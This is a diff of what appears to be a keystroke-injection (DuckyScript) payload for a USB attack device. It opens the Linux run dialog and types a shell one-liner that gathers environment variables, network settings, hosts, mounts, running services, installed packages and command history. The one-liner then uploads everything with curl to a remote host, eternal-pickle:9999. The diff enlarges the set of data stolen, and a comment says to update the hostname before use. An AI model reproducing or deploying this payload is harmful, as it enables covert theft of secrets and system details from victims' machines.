@@ -5,5 +5,5 @@ REM Make sure to update the hostname before using it.
 DELAY 1000
 ALT F2
 DELAY 100
-STRING sh -c "{ echo Env:; env; echo; echo Network:; nmcli; } | curl -F data='<-' http://eternal-pickle:9999"
+STRING sh -c "{ printf 'Hostname: '; hostname; echo; printf 'uname:    '; uname -a; echo; echo Env:; env; echo; echo Network:; nmcli; echo; /sbin/ifconfig -a; echo '/etc/hosts:'; cat /etc/hosts; echo; echo Mounts:; mount; echo; echo 'Running services:'; netstat -tunlpe; echo; echo 'Installed packages:'; dpkg -l || dnf list --installed || pacman -Ql; echo; echo 'Command history:'; history; echo; } | curl -F data='<-' http://eternal-pickle:9999"
 ENTER
